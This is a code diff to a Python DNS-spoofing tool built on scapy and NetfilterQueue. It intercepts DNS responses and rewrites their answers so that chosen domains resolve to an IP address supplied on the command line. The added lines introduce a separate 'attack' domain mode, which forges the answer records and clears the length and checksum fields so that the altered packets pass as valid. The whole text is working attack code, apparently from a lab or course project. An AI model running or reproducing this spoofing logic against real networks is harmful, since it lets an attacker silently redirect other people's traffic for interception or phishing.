@@ -2,13 +2,11 @@ from scapy.all import *
 from netfilterqueue import NetfilterQueue
 import os
 
-# DNS mapping records, feel free to add/modify this dictionary
-# for example, google.com will be redirected to 192.168.1.100
-
 ipv4 = sys.argv[1]
 
 hostdict = {}
 spoofdict= {}
+attackdict = {}
 domains = open('../domains.txt','r')
 urls = domains.readlines()
 for url in urls:
@@ -18,9 +16,12 @@ for url in urls:
 spoofbytes = bytes(sys.argv[2].strip(), encoding="utf-8")
 spoofdict[spoofbytes] = ipv4
 
+attackbytes = bytes(sys.argv[3].strip(), encoding="utf-8")
+attackdict[attackbytes] = ipv4
+
 def spoof_pkt(packet):
     
-    if sys.argv[2] == "None":
+    if sys.argv[2] == "None" and sys.argv[3] == "All":
         scapy_packet = IP(packet.get_payload())
         if scapy_packet.haslayer(DNSRR):
             try:
@@ -39,7 +40,7 @@ def spoof_pkt(packet):
             except IndexError:
                 pass
             packet.set_payload(bytes(scapy_packet))
-    else:
+    elif sys.argv[2] != "None":
         scapy_packet = IP(packet.get_payload())
         if scapy_packet.haslayer(DNSRR):
             print("[Before]:", scapy_packet.summary())
@@ -49,6 +50,25 @@ def spoof_pkt(packet):
                     pass
                 else:
                     scapy_packet[DNS].an = DNSRR(rrname=qname, rdata=spoofdict[qname])
+                    scapy_packet[DNS].ancount = 1
+                    del scapy_packet[IP].len
+                    del scapy_packet[IP].chksum
+                    del scapy_packet[UDP].len
+                    del scapy_packet[UDP].chksum
+            except IndexError:
+                pass
+            print("[After ]:", scapy_packet.summary())
+            packet.set_payload(bytes(scapy_packet))
+    else:
+        scapy_packet = IP(packet.get_payload())
+        if scapy_packet.haslayer(DNSRR):
+            print("[Before]:", scapy_packet.summary())
+            try:
+                qname = scapy_packet[DNSQR].qname
+                if qname not in attackdict:
+                    pass
+                else:
+                    scapy_packet[DNS].an = DNSRR(rrname=qname, rdata=attackdict[qname])
                     scapy_packet[DNS].ancount = 1
                     del scapy_packet[IP].len
                     del scapy_packet[IP].chksum
